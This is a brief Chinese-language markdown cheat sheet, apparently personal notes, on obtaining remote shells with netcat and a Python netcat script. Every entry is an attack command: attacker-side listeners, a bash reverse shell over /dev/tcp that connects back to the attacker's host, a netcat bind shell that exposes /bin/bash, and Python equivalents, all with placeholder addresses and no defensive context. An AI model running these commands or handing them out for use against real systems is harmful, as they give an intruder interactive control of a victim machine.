# NetCat

> python socket通信

###`nc`反弹shell

**反向**

攻击机 `nc -lvp port`

靶机 `/bin/bash -i >& /dev/tcp/ip/port 0>&1`

**正向**

攻击机 `nc ip port`

靶机 `nc -lvp -e /bin/bash`


`python nc`反弹shell
攻击机 `python3 netcat.py -t ip -p port`

靶机`python3 netcat.py -p port -lc`


